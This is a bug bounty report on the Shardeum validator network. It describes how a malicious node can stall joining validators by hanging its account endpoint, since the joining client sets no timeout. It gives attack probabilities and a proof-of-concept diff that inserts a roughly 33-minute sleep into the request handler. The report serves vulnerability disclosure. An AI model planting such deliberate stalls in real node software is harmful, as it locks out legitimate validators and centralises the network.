# #39027 \[BC-Insight] abusive join request handler node

## #39027 \[BC-Insight] Abusive Join request handler node

**Submitted on Jan 20th 2025 at 18:13:42 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39027
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Bypassing Penalties

### Description

## Description

When a validator wants to join the network. It send the join request to one of the node in consensus group, during the join request, the joining validator will need to get an account to gather staking info. The malicous validator that is hanlding the join request can delay the http call up to minutes so that joining validator will not be able to join for the whole duration of the delay.

## Impact

Using the parameter in the bugbounty branch, network baseline is 1280, and the shard size will be 128. Since the joining validator will only request join request to 1 of the node in consensus group. And the retries again for 3 times if the first one fails. The probability for malicious node to be picked is `[ 1 - (127/128)^3 ] = 0.0233 = 2.3%`. Although this is not a high probability overtime maclicious node will be picked and it'll reject legit validator for 30 cycles, increasing more malicous node from same operator or other party with same malicous practice will increase the probability of the attack. This will have a compunding effect and it only need 69 nodes to make the probability of the attack to be \~90%. 69 nodes is only 5.4% of the network size which is 1280. On summary 90% probability of the attack can be achieved by having only 5.4% of the malicious node that are exercising same practice. Overtime this attack will make network more centralized without anyone realizing it. Since there's no penalty for such attack this can be grow into wide spread practice among validator to have their own validator earn more time and more rewards.

## Fix

The primary cause of the attack is the joining validator does not have a timeout when executing `getNodeAccount()` will indefinte wait for the response as long as the server hang it.

### Proof of Concept

## Proof Of Concept

1. Please launch a network to act as legitimate network
2. Apply this patch file to the malicious node at shardeum repo code

```diff
diff --git a/config.json b/config.json
index a3dacc59..ba2d1f99 100644
--- a/config.json
+++ b/config.json
@@ -4,7 +4,7 @@
     "p2p": {
       "existingArchivers": [
         {
-          "ip": "localhost",
+          "ip": "0.0.0.0",
           "port": 4000,
           "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3"
         }
@@ -12,9 +12,9 @@
     },
     "ip": {
       "externalIp": "127.0.0.1",
-      "externalPort": 9001,
+      "externalPort": 9101,
       "internalIp": "127.0.0.1",
-      "internalPort": 10001
+      "internalPort": 11001
     },
     "reporting": {
       "report": true,
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..ce8303ed 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -9,7 +9,7 @@ import { Utils } from '@shardus/types'
 const overwriteMerge = (target: any[], source: any[]): any[] => source // eslint-disable-line @typescript-eslint/no-explicit-any

 export interface Config {
-  storage?: any // eslint-disable-line @typescript-eslint/no-explicit-any
+  storage?: any, // eslint-disable-line @typescript-eslint/no-explicit-any
   server: {
     globalAccount: string
     p2p?: {
@@ -99,6 +99,9 @@ if (process.env.EXISTING_ARCHIVERS) {
       config,
       {
         server: {
+          network: {
+            timeout: 100000
+          },
           p2p: {
             existingArchivers,
           },
@@ -143,9 +146,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 10,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +160,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later

       // 1.2.3 migration starts
diff --git a/src/index.ts b/src/index.ts
index 22fb7ae9..d293a85f 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -1686,6 +1686,8 @@ const configShardusEndpoints = (): void => {
   })

   shardus.registerExternalGet('account/:address', externalApiMiddleware, async (req, res) => {
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
+    await sleep(2000 * 1000)
     if (trySpendServicePoints(ShardeumFlags.ServicePoints['account/:address'], req, 'account') === false) {
       res.json({ error: 'node busy' })
       return

```

3. Launch the malicious node and wait for it to go active
4. Launch the new joining validator node
5. Now if the joining validator pick the malicous node to send the join request, the joining validator will not be able to join the network for 30 cycles
